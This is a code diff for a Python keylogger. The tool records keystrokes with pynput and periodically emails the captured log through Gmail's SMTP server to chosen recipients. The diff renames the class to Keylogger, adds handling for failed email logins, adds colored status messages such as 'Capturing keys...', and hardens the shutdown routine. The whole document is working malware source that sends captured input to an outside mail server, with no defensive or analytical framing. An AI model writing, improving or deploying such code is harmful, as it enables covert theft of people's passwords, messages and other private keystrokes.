@@ -3,10 +3,12 @@
 import pynput.keyboard
 import threading
 import smtplib
+import os
 
+from termcolor import colored
 from email.mime.text import MIMEText
 
-class Keyboard:
+class Keylogger:
 
     def __init__(self, sender, password, recipients):
         self.log = ""
@@ -31,11 +33,18 @@ class Keyboard:
         msg['To'] = ', '.join(recipients)
 
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
-            smtp_server.login(sender, password)
-            smtp_server.sendmail(sender, recipients, msg.as_string())
+            try:
+                smtp_server.login(sender, password)
+                smtp_server.sendmail(sender, recipients, msg.as_string())
+            except smtplib.SMTPAuthenticationError:
+                print(colored("\n[!] Incorrect credentials to send email.\n", "red"))
+                self.shutdown()
+                os._exit(1)
 
     def clear_log(self):
-        self.log = "\n[+] Keylogger initialized\n" if self.is_first_run else self.log
+        self.log = "\n[+] The keylogger has been initialized\n" if self.is_first_run else self.log
+        if self.is_first_run:
+            print(colored("\n[+] Capturing keys...\n", "blue"))
         self.send_email("keylogger", self.log, self.sender, self.recipients, self.password)
         self.log = ""
         self.is_first_run = False
@@ -46,7 +55,10 @@ class Keyboard:
 
     def shutdown(self):
         self.request_shutdown = True
-        self.timer.cancel()
+        try:
+            self.timer.cancel()
+        except:
+            pass
 
     def start(self):
         keylogger = pynput.keyboard.Listener(on_press=self.process_key)
